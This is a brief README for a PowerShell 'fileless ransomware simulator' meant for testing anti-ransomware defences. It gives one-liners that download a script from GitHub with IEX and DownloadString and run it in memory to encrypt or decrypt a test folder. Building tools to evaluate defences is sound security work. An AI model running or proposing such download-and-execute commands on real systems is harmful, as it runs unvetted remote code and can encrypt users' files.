# RansomSimulator

Fileless ransomware simulator - to evaluate your anti-ransomware mitigation technology

You can execute it from any powershell commandline:

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1");Invoke-RansomSIM -Mode Encrypt -Path 'C:\Users\tester\Documents\Test';

To decrypt the files use the Decrypt switch:

IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/RansomSimulator/main/Invoke-RansomSIM.ps1");Invoke-RansomSIM -Mode Decrypt -Path 'C:\Users\tester\Documents\Test';
